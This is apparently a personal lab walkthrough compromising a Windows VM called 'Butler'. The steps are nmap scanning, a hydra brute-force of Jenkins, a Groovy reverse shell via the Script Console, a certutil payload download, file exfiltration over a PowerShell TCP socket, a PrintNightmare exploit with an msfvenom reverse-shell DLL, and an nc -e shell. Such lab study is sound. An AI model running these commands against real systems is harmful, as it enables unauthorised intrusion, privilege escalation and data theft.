# Scanning & Enumeration
## Nmap

Scan subnet:
```bash
nmap -sn 10.0.0.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 14:11 CET
Nmap scan report for 10.0.0.11
Host is up (0.00052s latency).
Nmap scan report for 10.0.0.16
Host is up (0.00043s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 3.95 seconds
```

Scan all ports:
```bash
# Nmap 7.94SVN scan initiated Thu Mar  7 14:12:29 2024 as: nmap -p- -oN butler_all.nmap 10.0.0.16
Nmap scan report for 10.0.0.16
Host is up (0.0013s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8080/tcp  open  http-proxy
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

# Nmap done at Thu Mar  7 14:13:30 2024 -- 1 IP address (1 host up) scanned in 61.17 seconds
```

Scan services on open ports:
```bash
# Nmap 7.94SVN scan initiated Thu Mar  7 14:15:52 2024 as: nmap -p 135,139,445,5040,7680,8080,49664,49665,49666,49667,49668,49669 -sV -sC -oN butler_open.nmap 10.0.0.16
Nmap scan report for 10.0.0.16
Host is up (0.00050s latency).

PORT      STATE  SERVICE       VERSION
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
5040/tcp  open   unknown
7680/tcp  closed pando-pub
8080/tcp  open   http          Jetty 9.4.41.v20210516
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.41.v20210516)
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f8:85:5f (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-07T22:18:28
|_  start_date: N/A
|_clock-skew: 8h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar  7 14:18:44 2024 -- 1 IP address (1 host up) scanned in 172.05 seconds
```

## HTTP

Port 8080:
![[Pasted image 20240307143033.png]]

![[Pasted image 20240307145154.png]]
=> Jenkins Version 2.289.3
URL http://10.0.0.16:8080/error confirms the version

# Exploitation

https://wanderication.medium.com/exploiting-jenkins-advanced-exploitation-tryhackme-662cb12a71bc

Login brute with hydra:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.16 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password"
```
Nope

Follow with official solution.
# Official solution

Turns out brute-forcing jenkins login was the right path, just the username was wrong.

Username: jenkins
Password: jenkins

Navigate to "Manage Jenkins" -> "Script Console". Searching for "jenkins groovy script reverse shell" on Google gives us as first result: https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
Change to host to our attacker machine and open a netcat listener to catch the shell:
```groovy
String host="10.0.0.11";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![[Pasted image 20240308090434.png]]

With the command *systeminfo* we can get information about the running system:
![[Pasted image 20240308091740.png]]
## Privesc

### WinPEAS

For privilege escalation we use *winpeas* https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS.
Download the x64 executable and server it via HTTP:
```bash
python3 -m http.server
```
On the windows machine we can use the native OS command *certutil* to fetch the exe:
```cmd
certutil.exe -urlcache -f http://10.0.0.11:8000/winPEASx64.exe winPEASx64.exe
```

![[Pasted image 20240308091317.png]]
Run winpeas and see if we can find something usefull for privesc.
Unfortunately *winPEASx64.exe* (aswell as *winPEASx86.exe*) output errors.

We dont' follow the official solution cause winPEAS doesn't work for us.

## My solution
### PrivescCheck

Use another privesc script *PrivescCheck*. Download the ps1 file and execute it as follows:
```cmd
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT"
```
This creates an output file *PrivescCheck_BUTLER.txt*.

**Transfer file with SCP**
We can transfer this file to our Kali machine via *scp*:
First start ssh server:
```bash
sudo systemctl start ssh
```
Transfer file:
```cmd
scp PrivescCheck_BUTLER.txt kali@10.0.0.11:~/Downloads/
```
Scp command didn't work, it just got stuck.

**Transfer file via TCP connection**
On kali:
```bash
nc -vlnp 9999 > PrivescCheck_BUTLER.txt
```
On Windows:
```
powershell -command "$butler=[System.Convert]::ToBase64String([io.file]::ReadAllBytes(\"PrivescCheck_BUTLER.txt\"));$socket=New-Object net.sockets.tcpclient('10.0.0.11',9999);$stream=$socket.GetStream();$writer=new-object System.IO.StreamWriter($stream);$buffer=new-object System.Byte[] 1024;$writer.WriteLine($butler);$socket.close()"
```
On kali:
```bash
cat PrivescCheck_BUTLER.txt | base64 -d
```

Potential privesc vector:
![[Pasted image 20240308105323.png]]
Manual check:
```cmd
reg query "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Indeed it is disabled:
![[Pasted image 20240308105408.png]]

Exploit: https://github.com/calebstewart/CVE-2021-1675
Download the exploit script to the windows machine.

Use *msfvenom* to create a reverse shell DLL:
```bash
msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll LHOST=10.0.0.11 LPORT=54311 > reverse_64bit.dll
```
Download "reverse_64bit.dll" to the windows machine.

Invoke the exploit script:
```cmd
powershell -ep bypass -c ". .\cve-2021-1675.ps1;Invoke-Nightmare -DLL reverse_64bit.dll"
```
Unfortunately the script produces an error:
![[Pasted image 20240308141429.png]]

If we invoke the exploit script without DLL it works, and per default creates a local admin user:
```cmd
powershell -ep bypass -c ". .\cve-2021-1675.ps1;Invoke-Nightmare"
```
Created an admin user (adm1n:P@ssw0rd):
![[Pasted image 20240308141614.png]]
User adm1n was indeed created:
![[Pasted image 20240308150907.png]]

Invoke system shell:
```cmd
runas /user:WORKGROUP\adm1n cmd.exe
```
Terminates immediately, and doesn't let us provide a password.

Tried a _LOT_ of commands to open a shell for the user adm1n. But failed...

Start new cmd process with powershell:
```cmd
powershell -command "$username='adm1n';$password='P@ssw0rd';$credentials=New-Object System.Management.Automation.PSCredential -ArgumentList @($username,(ConvertTo-SecureString -String $password -AsPlainText -Force));Start-Process nc.exe -ArgumentList '-e','cmd.exe','10.0.0.11','54311' -Credential ($credentials)
```

```
(Start-Process powershell.exe -Credential $credentials -Windowstyle Hidden -ArgumentList ("-noProfile -ExecutionPolicy Bypass -file C:\Program Files\Jenkins\revshell.ps1") -PassThru).WaitForExit()
```

```
runas /user:adm1n "powershell Start-Transcript -Path C:\Program Files\Jenkins\testlog.txt;import-module 'C:\Program Files\Jenkins\revshell.ps1';Stop-Transcript"
```
# Windows privesc scripts/exe

https://www.hackingarticles.in/window-privilege-escalation-automated-script/

- WinPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- PrivescCheck: https://github.com/itm4n/PrivescCheck
- Seat Belt: https://github.com/GhostPack/Seatbelt
- Powerup: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- windows-privesc-check: https://github.com/pentestmonkey/windows-privesc-check
- Windows-Exploit-Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester